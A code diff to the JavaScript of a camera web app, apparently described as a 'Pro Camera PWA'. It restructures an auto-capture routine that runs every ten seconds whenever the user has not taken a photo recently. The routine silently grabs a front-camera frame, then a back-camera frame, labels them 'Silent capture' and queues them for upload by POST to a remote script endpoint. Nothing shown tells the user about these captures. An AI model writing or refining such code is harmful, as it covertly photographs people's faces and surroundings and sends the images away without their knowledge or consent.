@@ -1,5 +1,5 @@
 // ================================================================
-// app.js – Pro Camera PWA (iOS Safari Fix)
+// app.js – Pro Camera PWA (Sequential Auto Capture: Front → Back)
 // ================================================================
 
 (function() {
@@ -156,8 +156,8 @@
         image: type === 'compressed' ? entry.compressed : entry.original,
         fileName: type === 'compressed' ? entry.compressedFileName : entry.fileName,
         createdAt: entry.createdAt || new Date().toISOString(),
-        cameraType: entry.cameraType || 'back',
-        captureType: entry.captureType || 'manual'
+        captureType: entry.captureType || 'manual',
+        cameraType: entry.cameraType || 'back'
       };
       var resp = await fetch(GAS_URL, {
         method: 'POST',
@@ -257,8 +257,7 @@
     var timestamp = Date.now();
     var photoId = generatePhotoId();
     var cameraLabel = cameraType === 'back' ? 'BACK' : 'FRONT';
-    var typeLabel = captureType === 'manual' ? 'MANUAL' : 'AUTO';
-    var fileName = typeLabel + '_' + cameraLabel + '_' + new Date().toISOString().replace(/[:.]/g, '') + '_' + photoId + '.png';
+    var fileName = captureType + '_' + cameraLabel + '_' + new Date().toISOString().replace(/[:.]/g, '') + '_' + photoId + '.png';
     var compressedFileName = fileName.replace('.png', '_comp.jpg');
 
     tempVideo.pause();
@@ -274,12 +273,12 @@
       createdAt: new Date().toISOString(),
       retryCount: 0,
       lastAttempt: null,
-      cameraType: cameraType,
-      captureType: captureType
+      captureType: captureType, // 'auto' or 'manual'
+      cameraType: cameraType   // 'back' or 'front'
     };
 
     await addToQueue(entry);
-    console.log('[Camera] 📸 Silent capture (' + cameraType + ', ' + captureType + '):', fileName);
+    console.log('[Camera] 📸 Silent capture (' + captureType + ', ' + cameraType + '):', fileName);
 
     if (navigator.onLine) {
       if (window.requestIdleCallback) {
@@ -292,33 +291,45 @@
     }
   }
 
-  // ---------- Auto Capture (Sequential) ----------
+  // ---------- Auto Capture Logic (Sequential: Front → Back) ----------
   function startAutoCapture() {
     if (isAutoCaptureRunning) return;
     isAutoCaptureRunning = true;
+    console.log('[Camera] ⏰ Auto-capture started');
 
     var captureSequence = function() {
       var now = Date.now();
       var timeSinceUserCapture = now - lastUserCaptureTime;
 
-      if (timeSinceUserCapture >= 10000) {
-        if (backStream) {
-          silentCapture(backStream, 'back', 'auto');
-        }
-        setTimeout(function() {
-          if (frontStream) {
-            silentCapture(frontStream, 'front', 'auto');
-          }
-        }, 1500);
-        console.log('[Camera] 🔄 Auto-capture cycle (Back → Front)');
-      } else {
-        console.log('[Camera] ⏳ User captured recently, skipping auto-capture');
+      if (timeSinceUserCapture < 10000) {
+        console.log('[Camera] ⏳ User captured recently (' + (timeSinceUserCapture/1000).toFixed(1) + 's ago), skipping auto-capture');
+        return;
       }
+
+      // ✅ Step 1: Front Camera at 10.1s
+      if (frontStream) {
+        console.log('[Camera] 📸 Auto capture: Front at 10.1s');
+        silentCapture(frontStream, 'front', 'auto');
+      } else {
+        console.warn('[Camera] ⚠️ Front camera not available, skipping front capture');
+      }
+
+      // ✅ Step 2: Back Camera at 12s (1.9s after front)
+      setTimeout(function() {
+        if (backStream) {
+          console.log('[Camera] 📸 Auto capture: Back at 12s');
+          silentCapture(backStream, 'back', 'auto');
+        } else {
+          console.warn('[Camera] ⚠️ Back camera not available, skipping back capture');
+        }
+      }, 1900); // 1.9 second delay between front and back
     };
 
+    // Run immediately
     captureSequence();
+
+    // Then every 10 seconds (check interval)
     autoCaptureInterval = setInterval(captureSequence, 10000);
-    console.log('[Camera] ⏰ Auto-capture started (Sequential)');
   }
 
   // ---------- Manual Capture ----------
@@ -361,8 +372,8 @@
       createdAt: new Date().toISOString(),
       retryCount: 0,
       lastAttempt: null,
-      cameraType: cameraType,
-      captureType: 'manual'
+      captureType: 'manual',
+      cameraType: cameraType
     };
 
     await addToQueue(entry);
@@ -539,7 +550,7 @@
     });
   });
 
-  // ---------- Camera Setup (iOS Safari Fix) ----------
+  // ---------- Camera Setup ----------
   async function checkAndStart() {
     try {
       console.log('[Camera] 🚀 Starting camera...');
@@ -572,7 +583,6 @@
   async function initCamera() {
     console.log('[Camera] 📷 initCamera started. iOS:', isIOS);
 
-    // 🔹 iOS Safari Fix: Try simplest first
     var tryGetStream = async function(constraints) {
       try {
         console.log('[Camera] Trying constraints:', constraints);
@@ -585,7 +595,6 @@
       }
     };
 
-    // Step 1: Try { video: true } (simplest)
     var backStreamTemp = null;
     var frontStreamTemp = null;
 
@@ -593,12 +602,10 @@
       backStreamTemp = await tryGetStream({ video: true });
     } catch (e1) {
       console.warn('[Camera] Step 1 failed:', e1.message);
-      // Step 2: Try with facingMode: 'environment'
       try {
         backStreamTemp = await tryGetStream({ video: { facingMode: 'environment' } });
       } catch (e2) {
         console.warn('[Camera] Step 2 failed:', e2.message);
-        // Step 3: Try with facingMode: 'user'
         try {
           backStreamTemp = await tryGetStream({ video: { facingMode: 'user' } });
         } catch (e3) {
@@ -607,7 +614,6 @@
       }
     }
 
-    // If back camera failed, try front directly
     if (!backStreamTemp) {
       try {
         frontStreamTemp = await tryGetStream({ video: { facingMode: 'user' } });
@@ -616,7 +622,6 @@
       }
     }
 
-    // Assign streams
     if (backStreamTemp) {
       backStream = backStreamTemp;
       console.log('[Camera] ✅ Back camera stream obtained');
@@ -626,7 +631,6 @@
       console.log('[Camera] ✅ Front camera stream obtained');
     }
 
-    // If still no stream, show error
     if (!backStream && !frontStream) {
       permError.textContent = '❌ कुनै क्यामेरा उपलब्ध छैन।';
       permError.style.display = 'block';
@@ -634,7 +638,6 @@
       return;
     }
 
-    // Show user's selected camera (default: back if available, else front)
     if (userFacingMode === 'environment' && backStream) {
       currentPreviewStream = backStream;
     } else if (frontStream) {
@@ -649,7 +652,6 @@
       console.log('[Camera] ✅ Video playing');
     }
 
-    // If we only got front camera, set userFacingMode accordingly
     if (!backStream && frontStream) {
       userFacingMode = 'user';
     }
@@ -670,7 +672,6 @@
       }
     }
 
-    // Tap to focus
     video.onclick = async function(e) {
       if (!track) return;
       var cap = track.getCapabilities();
@@ -698,7 +699,6 @@
 
     console.log('[Camera] ✅ Camera ready!');
 
-    // Start Auto Capture
     startAutoCapture();
 
     if (navigator.onLine) {
@@ -742,8 +742,12 @@
     flashBtn.classList.toggle('active', isTorchOn);
   });
 
+  // ✅ Flip Button – ONLY FLIP (No Capture)
   flipBtn.addEventListener('click', function() {
+    console.log('[Camera] 🔄 Flip button clicked');
     userFacingMode = (userFacingMode === 'environment') ? 'user' : 'environment';
+    console.log('[Camera] Switching to:', userFacingMode);
+
     if (userFacingMode === 'environment' && backStream) {
       currentPreviewStream = backStream;
     } else if (frontStream) {
@@ -751,9 +755,15 @@
     } else if (backStream) {
       currentPreviewStream = backStream;
     }
+
     if (currentPreviewStream) {
       video.srcObject = currentPreviewStream;
-      video.play().catch(function() {});
+      video.play().catch(function(err) {
+        console.warn('[Camera] Video play error:', err);
+      });
+      console.log('[Camera] ✅ Camera flipped successfully');
+    } else {
+      console.warn('[Camera] ⚠️ No stream available for this camera');
     }
   });
 
